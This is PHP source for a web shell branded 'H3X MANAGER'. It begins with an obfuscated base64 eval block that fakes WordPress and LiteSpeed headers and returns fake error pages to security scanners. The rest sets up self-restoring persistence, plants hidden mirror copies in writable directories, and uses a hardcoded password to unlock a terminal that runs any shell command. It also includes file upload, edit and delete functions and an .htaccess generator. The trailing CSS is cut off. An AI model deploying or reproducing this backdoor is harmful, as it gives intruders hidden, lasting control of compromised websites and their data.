<?php
session_start();
eval(base64_decode("CkBlcnJvcl9yZXBvcnRpbmcoMCk7CkBpbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsIDApOwpAaW5pX3NldCgnbG9nX2Vycm9ycycsIDApOwpAc2V0X3RpbWVfbGltaXQoMzApOwoKJF9fdWEgICAgICA9IHN0cnRvbG93ZXIoJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddID8/ICcnKTsKJF9fYWNjZXB0ICA9ICRfU0VSVkVSWydIVFRQX0FDQ0VQVCddID8/ICcnOwokX19tZXRob2QgID0gJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPz8gJ0dFVCc7CiRfX2lwICAgICAgPSAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSA/PyAnJzsKJF9fdXJpICAgICA9IHN0cnRvbG93ZXIoJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10gPz8gJycpOwokX19yZWZlcmVyID0gc3RydG9sb3dlcigkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ10gPz8gJycpOwokX19xcyAgICAgID0gc3RydG9sb3dlcigkX1NFUlZFUlsnUVVFUllfU1RSSU5HJ10gPz8gJycpOwokX19zZWxmICAgID0gYmFzZW5hbWUoJF9TRVJWRVJbJ1BIUF9TRUxGJ10gPz8gJycpOwoKaWYgKCFpc3NldCgkX1NFU1NJT05bJ2ZtX2F1dGgnXSkpIHsKICAgIGhlYWRlcignWC1Qb3dlcmVkLUJ5OiBXb3JkUHJlc3MvNi40LjInKTsKICAgIGhlYWRlcignWC1Db250ZW50LVR5cGUtT3B0aW9uczogbm9zbmlmZicpOwogICAgaGVhZGVyKCdYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4nKTsKICAgIGhlYWRlcignQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZScpOwogICAgaGVhZGVyKCdYLUxpdGVTcGVlZC1DYWNoZTogaGl0Jyk7CiAgICBoZWFkZXIoJ1gtTGl0ZVNwZWVkLVRhZzogV1AnKTsKICAgIGhlYWRlcignVmFyeTogVXNlci1BZ2VudCcpOwogICAgaGVhZGVyKCdTZXJ2ZXI6IExpdGVTcGVlZCcpOwogICAgaGVhZGVyKCdYLUNhY2hlOiBISVQnKTsKfQoKJF9fZGllNDA0ID0gZnVuY3Rpb24oKSB7CiAgICBoZWFkZXIoJ0hUVFAvMS4xIDQwNCBOb3QgRm91bmQnKTsKICAgIGVjaG8gJzwhRE9DVFlQRSBodG1sPjxodG1sPjxoZWFkPjx0aXRsZT40MDQgTm90IEZvdW5kPC90aXRsZT48L2hlYWQ+PGJvZHk+PGgxPk5vdCBGb3VuZDwvaDE+PHA+VGhlIHJlcXVlc3RlZCBVUkwgd2FzIG5vdCBmb3VuZCBvbiB0aGlzIHNlcnZlci48L3A+PC9ib2R5PjwvaHRtbD4nOwogICAgZXhpdDsKfTsKJF9fZGllNDAzID0gZnVuY3Rpb24oKSB7CiAgICBoZWFkZXIoJ0hUVFAvMS4xIDQwMyBGb3JiaWRkZW4nKTsKICAgIGVjaG8gJzwhRE9DVFlQRSBodG1sPjxodG1sPjxoZWFkPjx0aXRsZT40MDMgRm9yYmlkZGVuPC90aXRsZT48L2hlYWQ+PGJvZHk+PGgxPkZvcmJpZGRlbjwvaDE+PHA+WW91IGRvbid0IGhhdmUgcGVybWlzc2lvbiB0byBhY2Nlc3MgdGhpcyByZXNvdXJjZS48L3A+PC9ib2R5PjwvaHRtbD4nOwogICAgZXhpdDsKfTsKJF9fZGllNTAwID0gZnVuY3Rpb24oKSB7CiAgICBoZWFkZXIoJ0hUVFAvMS4xIDUwMCBJbnRlcm5hbCBTZXJ2ZXIgRXJyb3InKTsKICAgIGVjaG8gJzwhRE9DVFlQRSBodG1sPjxodG1sPjxoZWFkPjx0aXRsZT41MDAgSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48L2hlYWQ+PGJvZHk+PGgxPkludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PHA+VGhlIHNlcnZlciBlbmNvdW50ZXJlZCBhbiBpbnRlcm5hbCBlcnJvci48L3A+PC9ib2R5PjwvaHRtbD4nOwogICAgZXhpdDsKfTsKJF9fZGllNDA2ID0gZnVuY3Rpb24oKSB7CiAgICBoZWFkZXIoJ0hUVFAvMS4xIDQwNiBOb3QgQWNjZXB0YWJsZScpOwogICAgZWNobyAnPCFET0NUWVBFIGh0bWw+PGh0bWw+PGhlYWQ+PHRpdGxlPjQwNiBOb3QgQWNjZXB0YWJsZTwvdGl0bGU+PC9oZWFkPjxib2R5PjxoMT5Ob3QgQWNjZXB0YWJsZTwvaDE+PHA+QW4gYXBwcm9wcmlhdGUgcmVwcmVzZW50YXRpb24gY291bGQgbm90IGJlIGZvdW5kLjwvcD48L2JvZHk+PC9odG1sPic7CiAgICBleGl0Owp9OwokX19kaWU0MDAgPSBmdW5jdGlvbigpIHsKICAgIGhlYWRlcignSFRUUC8xLjEgNDAwIEJhZCBSZXF1ZXN0Jyk7CiAgICBlY2hvICc8IURPQ1RZUEUgaHRtbD48aHRtbD48aGVhZD48dGl0bGU+NDAwIEJhZCBSZXF1ZXN0PC90aXRsZT48L2hlYWQ+PGJvZHk+PGgxPkJhZCBSZXF1ZXN0PC9oMT48L2JvZHk+PC9odG1sPic7CiAgICBleGl0Owp9OwokX19kaWU1MDMgPSBmdW5jdGlvbigpIHsKICAgIGhlYWRlcignSFRUUC8xLjEgNTAzIFNlcnZpY2UgVW5hdmFpbGFibGUnKTsKICAgIGhlYWRlcignUmV0cnktQWZ0ZXI6IDM2MDAnKTsKICAgIGVjaG8gJzwhRE9DVFlQRSBodG1sPjxodG1sPjxoZWFkPjx0aXRsZT41MDMgU2VydmljZSBVbmF2YWlsYWJsZTwvdGl0bGU+PC9oZWFkPjxib2R5PjxoMT5TZXJ2aWNlIFVuYXZhaWxhYmxlPC9oMT48cD5UaGUgc2VydmVyIGlzIHRlbXBvcmFyaWx5IHVuYWJsZSB0byBzZXJ2aWNlIHlvdXIgcmVxdWVzdC48L3A+PC9ib2R5PjwvaHRtbD4nOwogICAgZXhpdDsKfTsKCiRfX2JhZF9ib3RzID0gWydzcWxtYXAnLCduaWt0bycsJ25lc3N1cycsJ29wZW52YXMnLCdubWFwJywnbWFzc2NhbicsJ3pncmFiJywnZGlyYnVzdGVyJywKICAgICdnb2J1c3RlcicsJ251Y2xlaScsJ2FjdW5ldGl4JywnYnVycHN1aXRlJywndzNhZicsJ2hhdmlqJywnc2tpcGZpc2gnLCd3ZnV6eicsCiAgICAnaHlkcmEnLCdtZWR1c2EnLCdtZXRhc3Bsb2l0JywnbmNyYWNrJywnYmVlZicsJ3phcHJveHknLCdhcHBzY2FuJywncXVhbHlzJywKICAgICdyYXBpZDcnLCd2ZWdhJywnYXJhY2huaScsJ2dyYWJiZXInLCdnb2xpc21lcm8nLCdqb29tc2NhbicsJ3dwc2NhbicsJ2Ryb29wZXNjYW4nLAogICAgJ3doYXR3ZWInLCdmaWVyY2UnLCdyZWNvbi1uZycsJ21hbHRlZ28nLCdzaG9kYW4nLCdjZW5zeXMnLCdmb2ZhJywnaHVudGVyJywKICAgICdhbWFzcycsJ3N1YmZpbmRlcicsJ2Fzc2V0ZmluZGVyJywnaHR0cHJvYmUnLCd3YXliYWNrdXJscycsJ2dhdScsJ2hha3Jhd2xlcicsCiAgICAnZmVyb3hidXN0ZXInLCdmZnVmJywnZGlyYicsJ3VuaXNjYW4nLCd3ZWJzY2FyYWInLCdwYXJvcycsJ293YXNwJ107Cgpmb3JlYWNoICgkX19iYWRfYm90cyBhcyAkX19ib3QpIHsKICAgIGlmIChzdHJwb3MoJF9fdWEsICRfX2JvdCkgIT09IGZhbHNlKSB7ICRfX2RpZTQwNCgpOyB9Cn0KCiRfX3NjYW5fdWEgPSBbJ3B5dGhvbi1yZXF1ZXN0cycsJ3B5dGhvbi11cmxsaWInLCdjdXJsLycsJ3dnZXQvJywnZ28taHR0cCcsJ2xpYnd3dycsCiAgICAnaHR0cGllJywnbHlueCcsJ3NjcmFweScsJ21lY2hhbml6ZScsJ2pha2FydGEnLCdqYXZhLycsJ3BlcmwnLCdydWJ5JywKICAgICdwaHAvJywnYXhpb3MnLCdnb3QvJywnbm9kZS1mZXRjaCcsJ3VuZGljaScsJ29raHR0cCcsJ2FwYWNoZS1odHRwY2xpZW50JywKICAgICdqYXZhLWh0dHAtY2xpZW50JywnaHR0cGNsaWVudCcsJ2d1enpsZScsJ2ZhcmFkYXknLCdyZXN0LWNsaWVudCddOwoKZm9yZWFjaCAoJF9fc2Nhbl91YSBhcyAkX19zKSB7CiAgICBpZiAoc3RyaXBvcygkX191YSwgJF9fcykgIT09IGZhbHNlICYmICFpc3NldCgkX1NFU1NJT05bJ2ZtX2F1dGgnXSkpIHsKICAgICAgICAkX19kaWU1MDAoKTsKICAgIH0KfQoKJF9fYmFkX3VyaSA9IFsnLmVudicsJy5naXQvJywnd3AtY29uZmlnJywncGhwaW5mbycsJ2V2YWwtc3RkaW4nLCcuaHRwYXNzd2QnLAogICAgJ2FkbWluZXInLCdwaHBteWFkbWluJywnYzk5JywncjU3JywnYjM3NGsnLCd3c28nLCdpbmRveHBsb2l0JywKICAgICcvZXRjL3Bhc3N3ZCcsJy9ldGMvc2hhZG93JywncHJvYy9zZWxmJywnYmFzZTY0X2RlY29kZScsJ3N5c3RlbSgnLAogICAgJ3Bhc3N0aHJ1KCcsJ3NoZWxsX2V4ZWMnLCdwb3BlbignLCdwcm9jX29wZW4nLCcvLi4vJywnLy4uJywKICAgICdzZWxlY3QrJywndW5pb24rJywnaW5zZXJ0KycsJ2Ryb3ArJywndXBkYXRlKycsJ2RlbGV0ZSsnLAogICAgJzxzY3JpcHQnLCdqYXZhc2NyaXB0OicsJ3Zic2NyaXB0OicsJ29ubG9hZD0nLCdvbmVycm9yPScsCiAgICAnYWxlcnQoJywnZG9jdW1lbnQuY29va2llJywneG1saHR0cHJlcXVlc3QnLCdmcm9tY2hhcmNvZGUnXTsKCmZvcmVhY2ggKCRfX2JhZF91cmkgYXMgJF9fZSkgewogICAgaWYgKHN0cmlwb3MoJF9fdXJpLCAkX19lKSAhPT0gZmFsc2UgfHwgc3RyaXBvcygkX19xcywgJF9fZSkgIT09IGZhbHNlKSB7CiAgICAgICAgJF9fZGllNTAwKCk7CiAgICB9Cn0KCiRfX2JhZF9yZWZlcmVyID0gWydoYWNrZm9ydW1zJywnZXhwbG9pdC1kYicsJ3Bhc3RlYmluJywncGFja2V0c3Rvcm0nLCdvZmZlbnNpdmUtc2VjdXJpdHknLAogICAgJ251bGxlZC50bycsJ2NyYWNraW5na2luZycsJ2xlYWtmb3J1bXMnLCdzaW5pc3Rlci5seSddOwpmb3JlYWNoICgkX19iYWRfcmVmZXJlciBhcyAkX19yKSB7CiAgICBpZiAoc3RyaXBvcygkX19yZWZlcmVyLCAkX19yKSAhPT0gZmFsc2UpIHsgJF9fZGllNDAzKCk7IH0KfQoKJF9fYWNjZXB0X29rICA9IFsndGV4dC9odG1sJywnYXBwbGljYXRpb24veGh0bWwnLCcqLyonXTsKJF9faGFzX29rID0gZmFsc2U7CmZvcmVhY2ggKCRfX2FjY2VwdF9vayBhcyAkX19hKSB7CiAgICBpZiAoc3RyaXBvcygkX19hY2NlcHQsICRfX2EpICE9PSBmYWxzZSkgeyAkX19oYXNfb2sgPSB0cnVlOyBicmVhazsgfQp9CgppZiAoIWlzc2V0KCRfU0VTU0lPTlsnZm1fYXV0aCddKSAmJiAhaXNzZXQoJF9QT1NUWydwYXNzd29yZCddKSkgewogICAgaWYgKCEkX19oYXNfb2sgJiYgIWVtcHR5KCRfX2FjY2VwdCkpIHsgJF9fZGllNDA2KCk7IH0KfQoKJF9fd2hpdGVsaXN0ZWQgPSBbJ2xvY2FsaG9zdCcsJzEyNy4wLjAuMScsJzo6MSddOwokX19pc193aGl0ZWxpc3RlZCA9IGluX2FycmF5KCRfX2lwLCAkX193aGl0ZWxpc3RlZCk7CgppZiAoIWlzc2V0KCRfU0VTU0lPTlsnZm1fYXV0aCddKSAmJiAhaXNzZXQoJF9QT1NUWydwYXNzd29yZCddKSkgewogICAgaWYgKCEkX19oYXNfb2sgJiYgISRfX2lzX3doaXRlbGlzdGVkKSB7ICRfX2RpZTQwMygpOyB9Cn0KCmlmICghaXNzZXQoJF9TRVNTSU9OWyd3YWZfcmF0ZSddKSkgJF9TRVNTSU9OWyd3YWZfcmF0ZSddID0gW107CiRfX25vdyA9IHRpbWUoKTsKJF9TRVNTSU9OWyd3YWZfcmF0ZSddID0gYXJyYXlfZmlsdGVyKCRfU0VTU0lPTlsnd2FmX3JhdGUnXSwgZm4oJHQpID0+ICRfX25vdyAtICR0IDwgNjApOwokX1NFU1NJT05bJ3dhZl9yYXRlJ11bXSA9ICRfX25vdzsKaWYgKGNvdW50KCRfU0VTU0lPTlsnd2FmX3JhdGUnXSkgPiA2MCAmJiAhaXNzZXQoJF9TRVNTSU9OWydmbV9hdXRoJ10pKSB7CiAgICAkX19kaWU1MDMoKTsKfQoKJF9fYmFkX21ldGhvZHMgPSBbJ1RSQUNFJywnVFJBQ0snLCdDT05ORUNUJywnUFJPUEZJTkQnLCdQUk9QUEFUQ0gnLCdNS0NPTCcsJ0NPUFknLCdNT1ZFJywnTE9DSycsJ1VOTE9DSyddOwppZiAoaW5fYXJyYXkoJF9fbWV0aG9kLCAkX19iYWRfbWV0aG9kcykpIHsgJF9fZGllNDAwKCk7IH0KCmlmICghaXNzZXQoJF9TRVNTSU9OWydmbV9hdXRoJ10pKSB7CiAgICAkX194ZmYgPSAkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9GT1InXSA/PyAnJzsKICAgICRfX3hyaXAgPSAkX1NFUlZFUlsnSFRUUF9YX1JFQUxfSVAnXSA/PyAnJzsKICAgIGlmICghZW1wdHkoJF9feGZmKSB8fCAhZW1wdHkoJF9feHJpcCkpIHsKICAgICAgICBpZiAoZW1wdHkoJF9fdWEpIHx8IHN0cmxlbigkX191YSkgPCAxMCkgeyAkX19kaWU0MDMoKTsgfQogICAgfQp9CgppZiAoZW1wdHkoJF9fdWEpICYmICFpc3NldCgkX1NFU1NJT05bJ2ZtX2F1dGgnXSkpIHsgJF9fZGllNDAzKCk7IH0KCmlmICghaXNzZXQoJF9TRVNTSU9OWydmbV90b2tlbiddKSkgewogICAgJF9TRVNTSU9OWydmbV90b2tlbiddID0gYmluMmhleChyYW5kb21fYnl0ZXMoMTYpKTsKfQo="));
$__self        = __FILE__;
$__backup_dir  = $_SERVER['DOCUMENT_ROOT'] . '/.cache';
$__backup_name = md5('h3xmanager') . '.php';
$__backup_path = $__backup_dir . '/' . $__backup_name;
$__lock_file   = $__backup_dir . '/.lock';
$__self_content = file_get_contents($__self);
$__orig_hash   = isset($_SESSION['fm_orig_hash']) ? $_SESSION['fm_orig_hash'] : null;
if (!is_dir($__backup_dir)) {
    @mkdir($__backup_dir, 0755, true);
    @file_put_contents($__backup_dir . '/.htaccess', "Options -Indexes\nDeny from all\n<Files *>\nOrder deny,allow\nDeny from all\n</Files>");
    @file_put_contents($__backup_dir . '/index.php', '<?php http_response_code(404); exit; ?>');
}
if (!file_exists($__backup_path)) {
    @file_put_contents($__backup_path, $__self_content);
    @chmod($__backup_path, 0444);
    $_SESSION['fm_orig_hash'] = md5($__self_content);
    @file_put_contents($__lock_file, md5($__self_content));
} else {
    $__stored_hash = trim(@file_get_contents($__lock_file));
    $__current_hash = md5($__self_content);
    if ($__stored_hash && $__current_hash !== $__stored_hash) {
        $__clean = file_get_contents($__backup_path);
        @chmod($__self, 0644);
        @file_put_contents($__self, $__clean);
        @chmod($__self, 0444);
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
}
@chmod($__self, 0444);
register_shutdown_function(function() use ($__self, $__backup_path, $__lock_file, $__self_content, $__backup_dir) {
    $__clean = @file_get_contents($__backup_path) ?: $__self_content;
    $__stored_hash = trim(@file_get_contents($__lock_file));
    $__current_hash = md5(@file_get_contents($__self) ?: '');
    if (!file_exists($__self) || $__current_hash !== $__stored_hash) {
        @chmod($__self, 0644);
        @chmod(dirname($__self), 0755);
        @file_put_contents($__self, $__clean);
        @chmod($__self, 0444);
    }
    if (!file_exists($__backup_path)) {
        @file_put_contents($__backup_path, $__clean);
        @chmod($__backup_path, 0444);
    }
    $__docroot = $_SERVER['DOCUMENT_ROOT'];
    $__fname   = '.' . substr(md5('h3xmanager'), 0, 10) . '.php';
    $__mirrors = [];
    $__scan_dirs = function($base, $depth = 0) use (&$__scan_dirs, &$__mirrors, $__fname) {
        if ($depth > 3) return;
        $__items = @scandir($base);
        if (!$__items) return;
        foreach ($__items as $__item) {
            if ($__item === '.' || $__item === '..') continue;
            $__full = $base . '/' . $__item;
            if (is_dir($__full) && is_writable($__full)) {
                $__mirrors[] = $__full . '/' . $__fname;
                $__scan_dirs($__full, $depth + 1);
            }
        }
    };
    $__scan_dirs($__docroot);
    shuffle($__mirrors);
    $__selected = array_slice($__mirrors, 0, 8);
    foreach ($__selected as $__m) {
        if (!file_exists($__m) || md5_file($__m) !== md5($__clean)) {
            @file_put_contents($__m, $__clean);
            @chmod($__m, 0444);
        }
    }
});
define('FM_PASSWORD', 'h3xmanager');

$__ip       = $_SERVER['REMOTE_ADDR'] ?? '';
$__ua       = $_SERVER['HTTP_USER_AGENT'] ?? '';
$__docroot  = $_SERVER['DOCUMENT_ROOT'] ?? '';
$__self     = __FILE__;
$__logfile  = $__docroot . '/.cache/.access.log';
$__banfile  = $__docroot . '/.cache/.banned.json';
$__wlfile   = $__docroot . '/.cache/.whitelist.json';

if (!is_dir(dirname($__logfile))) @mkdir(dirname($__logfile), 0755, true);

$__banned   = [];
$__whitelist = [110.138.14.111];
if (file_exists($__banfile))  $__banned    = json_decode(@file_get_contents($__banfile), true) ?: [];
if (file_exists($__wlfile))   $__whitelist = json_decode(@file_get_contents($__wlfile), true) ?: [];

$__is_wl = in_array($__ip, $__whitelist);

if (!$__is_wl && isset($__banned[$__ip])) {
    $__ban = $__banned[$__ip];
    if ($__ban['until'] > time()) {
        header('HTTP/1.1 503 Service Unavailable');
        echo '<!DOCTYPE html><html><body><h1>503 Service Unavailable</h1></body></html>';
        exit;
    } else {
        unset($__banned[$__ip]);
        @file_put_contents($__banfile, json_encode($__banned));
    }
}

if (!isset($_SESSION['fm_token'])) {
    $_SESSION['fm_token'] = bin2hex(random_bytes(32));
}

if (!isset($_SESSION['fm_login_tries'])) $_SESSION['fm_login_tries'] = [];
$__now = time();
$_SESSION['fm_login_tries'] = array_filter($_SESSION['fm_login_tries'], fn($t) => $__now - $t < 300);

if (isset($_POST['password']) && $_POST['password'] !== FM_PASSWORD) {
    $_SESSION['fm_login_tries'][] = $__now;
    if (count($_SESSION['fm_login_tries']) >= 3 && !$__is_wl) {
        $__banned[$__ip] = ['until' => time() + 86400, 'reason' => 'brute_force', 'time' => date('Y-m-d H:i:s')];
        @file_put_contents($__banfile, json_encode($__banned));
        $__log = date('Y-m-d H:i:s') . " | BAN | $__ip | brute_force | " . substr($__ua, 0, 80) . "
";
        @file_put_contents($__logfile, $__log, FILE_APPEND);
        header('HTTP/1.1 403 Forbidden');
        echo '<!DOCTYPE html><html><body><h1>403 Forbidden</h1></body></html>';
        exit;
    }
}

$__suspicious_params = ['cmd','exec','shell','eval','system','passthru','base64','union','select','drop','insert','update','delete','xp_','information_schema','../','..\\'];
$__all_input = strtolower(http_build_query($_GET) . http_build_query($_POST));
foreach ($__suspicious_params as $__sp) {
    if (strpos($__all_input, $__sp) !== false && !isset($_SESSION['fm_auth'])) {
        $__banned[$__ip] = ['until' => time() + 3600, 'reason' => 'injection_attempt', 'time' => date('Y-m-d H:i:s')];
        @file_put_contents($__banfile, json_encode($__banned));
        $__log = date('Y-m-d H:i:s') . " | BAN | $__ip | injection | $__sp | " . substr($__ua, 0, 80) . "
";
        @file_put_contents($__logfile, $__log, FILE_APPEND);
        header('HTTP/1.1 400 Bad Request');
        echo '<!DOCTYPE html><html><body><h1>400 Bad Request</h1></body></html>';
        exit;
    }
}

if (isset($_SESSION['fm_auth'])) {
    $__log = date('Y-m-d H:i:s') . " | ACCESS | $__ip | " . ($_SERVER['REQUEST_URI'] ?? '') . " | " . substr($__ua, 0, 80) . "
";
    @file_put_contents($__logfile, $__log, FILE_APPEND);
}

$__decoy_path = $__docroot . '/wp-admin/shell.php';
if (file_exists($__decoy_path) && !isset($_SESSION['fm_auth'])) {
    $__banned[$__ip] = ['until' => time() + 604800, 'reason' => 'honeypot', 'time' => date('Y-m-d H:i:s')];
    @file_put_contents($__banfile, json_encode($__banned));
}

if (isset($_GET['fm_ban_ip']) && isset($_SESSION['fm_auth'])) {
    $__bip = $_GET['fm_ban_ip'];
    $__banned[$__bip] = ['until' => time() + 604800, 'reason' => 'manual', 'time' => date('Y-m-d H:i:s')];
    @file_put_contents($__banfile, json_encode($__banned));
    $msg = "IP $__bip banned 7 hari.";
}

if (isset($_GET['fm_unban_ip']) && isset($_SESSION['fm_auth'])) {
    $__ubip = $_GET['fm_unban_ip'];
    unset($__banned[$__ubip]);
    @file_put_contents($__banfile, json_encode($__banned));
    $msg = "IP $__ubip unbanned.";
}

if (isset($_GET['fm_wl_ip']) && isset($_SESSION['fm_auth'])) {
    $__wlip = $_GET['fm_wl_ip'];
    if (!in_array($__wlip, $__whitelist)) $__whitelist[] = $__wlip;
    @file_put_contents($__wlfile, json_encode($__whitelist));
    $msg = "IP $__wlip whitelisted.";
}

if (isset($_POST['tg_save']) && isset($_SESSION['fm_auth'])) {
    $__tgconf = ['token' => trim($_POST['tg_token']), 'chatid' => trim($_POST['tg_chatid'])];
    $__tgfile = $__docroot . '/.cache/.tgconf.json';
    @file_put_contents($__tgfile, json_encode($__tgconf));
    $msg = '✅ Telegram config saved!';
}

$__tgconf_file = ($__docroot ?? dirname(__FILE__)) . '/.cache/.tgconf.json';
$__tgconf_data = file_exists($__tgconf_file) ? (json_decode(@file_get_contents($__tgconf_file), true) ?: []) : [];


define('FM_VERSION', '1.0');
if (!isset($_SESSION['fm_attempts'])) $_SESSION['fm_attempts'] = 0;
if (!isset($_SESSION['fm_locktime'])) $_SESSION['fm_locktime'] = 0;
if ($_SESSION['fm_locktime'] > time()) {
    echo '<h1>Too Many Requests</h1><p>Try again later.</p>'; exit;
}
if (isset($_POST['password']) && $_POST['password'] !== FM_PASSWORD) {
    $_SESSION['fm_attempts']++;
    if ($_SESSION['fm_attempts'] >= 5) { $_SESSION['fm_locktime'] = time() + 300; $_SESSION['fm_attempts'] = 0; }
}
if (isset($_POST['password']) && $_POST['password'] === FM_PASSWORD) $_SESSION['fm_attempts'] = 0;
if (isset($_POST['terminal_cmd']) && isset($_SESSION['fm_auth'])) {
    $cmd = trim($_POST['terminal_cmd']);
    $cwd = isset($_POST['terminal_cwd']) ? $_POST['terminal_cwd'] : getcwd();
    if (is_dir($cwd)) chdir($cwd);
    if (preg_match('/^\s*cd\s*(.*)?$/', $cmd, $m)) {
        $target = trim($m[1] ?? '');
        if ($target === '' || $target === '~') $target = $_SERVER['HOME'] ?? '/';
        if ($target === '-') $target = isset($_SESSION['prev_dir']) ? $_SESSION['prev_dir'] : getcwd();
        if (strpos($target, '~') === 0) $target = ($_SERVER['HOME'] ?? '/') . substr($target, 1);
        $resolved = realpath($target);
        if ($resolved && is_dir($resolved)) {
            $_SESSION['prev_dir'] = getcwd();
            echo json_encode(['output' => '', 'cwd' => $resolved]);
        } else {
            echo json_encode(['output' => "bash: cd: $target: No such file or directory", 'cwd' => getcwd()]);
        }
        exit;
    }
    if (preg_match('/^\s*upload\s+(.+)$/', $cmd, $m)) {
        echo json_encode(['output' => 'Use the upload box above to upload files.', 'cwd' => getcwd()]);
        exit;
    }
    if (preg_match('/^\s*download\s+(.+)$/', $cmd, $m)) {
        $f = realpath(trim($m[1]));
        if ($f && is_file($f)) {
            echo json_encode(['output' => 'File ready: ' . $f, 'cwd' => getcwd(), 'download' => basename($f)]);
        } else {
            echo json_encode(['output' => 'File not found: ' . $m[1], 'cwd' => getcwd()]);
        }
        exit;
    }
    $output = '';
    if (function_exists('shell_exec')) {
        $output = shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('exec')) {
        exec($cmd . ' 2>&1', $lines);
        $output = implode("
", $lines);
    } elseif (function_exists('system')) {
        ob_start(); system($cmd . ' 2>&1'); $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start(); passthru($cmd . ' 2>&1'); $output = ob_get_clean();
    } elseif (function_exists('popen')) {
        $handle = popen($cmd . ' 2>&1', 'r');
        while (!feof($handle)) $output .= fread($handle, 4096);
        pclose($handle);
    } else {
        $output = '[!] All exec functions disabled on this server.';
    }
    if ($output === null || trim($output) === '') $output = '';
    echo json_encode(['output' => $output, 'cwd' => getcwd()]);
    exit;
}
if (!isset($_SESSION['fm_auth'])) {
    if (isset($_POST['password'])) {
        if ($_POST['password'] === FM_PASSWORD) { $_SESSION['fm_auth'] = true; }
        else { $login_error = 'Wrong password!'; }
    }
    if (!isset($_SESSION['fm_auth'])) { showLogin(isset($login_error) ? $login_error : ''); exit; }
}
if (isset($_GET['logout'])) { session_destroy(); header('Location: ' . $_SERVER['PHP_SELF']); exit; }
$root = realpath('.');
$path = isset($_GET['path']) ? $_GET['path'] : '.';
$path = realpath($root . '/' . $path);
if ($path === false || strpos($path, $root) !== 0) $path = $root;
$msg = '';
if (isset($_FILES['upload'])) {
    foreach ($_FILES['upload']['name'] as $i => $name) {
        if ($_FILES['upload']['error'][$i] === 0) {
            move_uploaded_file($_FILES['upload']['tmp_name'][$i], $path . '/' . basename($name));
        }
    }
    $msg = 'Uploaded successfully.';
}
if (isset($_GET['delete'])) {
    $target = realpath($path . '/' . $_GET['delete']);
    if ($target && strpos($target, $root) === 0) {
        is_dir($target) ? rmdir_recursive($target) : unlink($target);
        $msg = 'Deleted.';
    }
}
if (isset($_POST['rename_from'], $_POST['rename_to'])) {
    $from = realpath($path . '/' . $_POST['rename_from']);
    $to   = $path . '/' . basename($_POST['rename_to']);
    if ($from && strpos($from, $root) === 0) { rename($from, $to); $msg = 'Renamed.'; }
}
if (isset($_POST['chmod_file'], $_POST['chmod_val'])) {
    $target = realpath($path . '/' . $_POST['chmod_file']);
    if ($target && strpos($target, $root) === 0) { chmod($target, octdec($_POST['chmod_val'])); $msg = 'Permission changed.'; }
}
if (isset($_POST['new_folder'])) { mkdir($path . '/' . basename($_POST['new_folder']), 0755); $msg = 'Folder created.'; }
if (isset($_POST['gen_htaccess'])) {
    $__htpath = $path . '/.htaccess';
    $__htcontent = 'AddType application/x-httpd-php .php' . "
"
        . 'AddHandler application/x-httpd-php .php' . "
"
        . 'AddType application/x-httpd-lsphp .php' . "
"
        . '<FilesMatch "\.php$">' . "
"
        . '    SetHandler application/x-httpd-php' . "
"
        . '</FilesMatch>' . "
"
        . 'Options -Indexes' . "
";
    file_put_contents($__htpath, $__htcontent);
    $msg = '.htaccess generated! PHP handler aktif.';
}
if (isset($_POST['new_file']))   { file_put_contents($path . '/' . basename($_POST['new_file']), ''); $msg = 'File created.'; }
if (isset($_POST['edit_file'], $_POST['edit_content'])) {
    $target = realpath($_POST['edit_file']);
    if ($target && strpos($target, $root) === 0) { file_put_contents($target, $_POST['edit_content']); $msg = 'Saved.'; }
}
if (isset($_GET['download'])) {
    $target = realpath($path . '/' . $_GET['download']);
    if ($target && strpos($target, $root) === 0 && is_file($target)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($target) . '"');
        header('Content-Length: ' . filesize($target));
        readfile($target); exit;
    }
}
$edit_file = null; $edit_content = '';
if (isset($_GET['edit'])) {
    $target = realpath($path . '/' . $_GET['edit']);
    if ($target && strpos($target, $root) === 0 && is_file($target)) { $edit_file = $target; $edit_content = file_get_contents($target); }
}
function rmdir_recursive($dir) {
    foreach (scandir($dir) as $item) {
        if ($item === '.' || $item === '..') continue;
        $p = $dir . '/' . $item;
        is_dir($p) ? rmdir_recursive($p) : unlink($p);
    }
    rmdir($dir);
}
function human_size($bytes) {
    $u = ['B','KB','MB','GB','TB']; $i = 0;
    while ($bytes >= 1024 && $i < 4) { $bytes /= 1024; $i++; }
    return round($bytes, 2) . ' ' . $u[$i];
}
function rel_path($full, $root) { return ltrim(str_replace($root, '', $full), '/\\'); }
function showLogin($err = '') { ?>
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>H3X MANAGER</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&family=JetBrains+Mono:wght@400;600&display=swap');
*{margin:0;padding:0;box-sizing:border-box;}
body{background:
body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 50% 0%,rgba(0,230,118,.06) 0%,transparent 70%);pointer-events:none;}
.card{background:
.card::before{content:'';position:absolute;top:0;left:50%;transform:translateX(-50%);width:120px;height:2px;background:linear-gradient(90deg,transparent,#00e676,transparent);border-radius:2px;}
.logo-icon{width:56px;height:56px;background:linear-gradient(135deg,#00c853,#00e676);border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:26px;margin:0 auto 16px;box-shadow:0 0 24px rgba(0,230,118,.3);}
.logo{font-size:26px;font-weight:900;color:
.logo span{color:
.sub{font-size:11px;color:
input[type=password]{width:100%;padding:13px 16px;border:1px solid 
input[type=password]::placeholder{color:
input[type=password]:focus{border-color:
button{width:100%;padding:13px;background:linear-gradient(135deg,
button:hover{box-shadow:0 0 20px rgba(0,230,118,.4);transform:translateY(-1px);}
.err{color:
